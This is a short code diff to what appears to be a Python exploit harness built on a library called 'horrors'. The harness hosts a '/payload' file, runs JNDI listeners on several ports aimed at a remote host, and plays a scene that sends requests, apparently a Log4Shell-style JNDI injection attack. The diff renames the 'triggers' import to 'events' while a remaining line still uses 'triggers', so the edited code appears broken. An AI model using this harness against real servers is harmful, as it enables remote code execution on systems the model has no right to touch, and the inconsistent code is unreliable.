@@ -7,7 +7,7 @@ from horrors import (
     logging,
     scenarios,
     services,
-    triggers,
+    events,
 )
 
 
@@ -161,8 +161,9 @@ if __name__ == "__main__":
     httpd.add_route('/payload', open(payload_path, 'rb').read())
     httpd.set_event('run', when=triggers.PathContains('send-requests'))
 
-    story.set_debug()
+    # story.set_debug()
     for port in JNDI_PORTS:
         JNDI(story, address=context['rhost'], port=port)
+    story.add_scene(send_requests, when='run')
     story.add_scene(send_requests)
     story.play()
